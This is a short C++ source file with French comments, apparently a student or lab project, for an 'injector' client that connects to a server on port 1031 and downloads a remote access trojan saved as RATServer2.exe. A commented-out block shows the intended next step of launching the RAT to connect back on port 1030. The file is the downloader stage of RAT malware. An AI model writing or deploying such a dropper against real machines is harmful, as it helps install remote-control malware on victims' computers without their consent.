/*********************************************************************
client.cpp - Programme injecteur Client recevant l'injecteur
écrit par: Pierre-Marc Laforest
Date: 2017-03-24
**********************************************************************/

#include <stdio.h>
#include <iostream>
#include <string>
#include "comClientServer.h"

#define PORT_NUMB 1031
//#define ADRESSE_IP "172.16.13.35"
//#define ADRESSE_IP "localhost"

using namespace std;

int main(int argc, char **argv)
{
  //WORD wVersionRequested = MAKEWORD(1, 1);
  //WSADATA wsaData;
  SOCKET theSocket;
  int nRet;
  char ip_address_str[] = "localhost";
  char name_of_rat_exe[] = "RATServer2.exe";
  //short nPort;

  // Check for the host and port arguments
  if (argc != 1) 
    {
      cout << "\nSyntax: injecteurClient.exe";
      cout << endl;
      return -1;
    }

  //nPort = atoi(argv[2]);

  cout << "\nTelechargement du RAT..." << endl;
 
  // Initialize WinSock and check the version
  /*
    nRet = WSAStartup(wVersionRequested, &wsaData);
    if (wsaData.wVersion != wVersionRequested) 
    {
    cout << "Wrong version";
    return;
    }
  */

  client_initComAvecServer(ip_address_str, PORT_NUMB, &theSocket);
  receptionFichierParSocket(name_of_rat_exe, theSocket);
  fermerCom(&theSocket);
  terminerCom();

  // Si javais eu un peu plus de temps ...
  /*
    cout << "RAT recu, en attente d'une connection au server..." << endl;
    string connectToRAT = "RATServer2.exe localhost 1030";
    system(connectToRAT.c_str()); 
  */

  return 0;
}

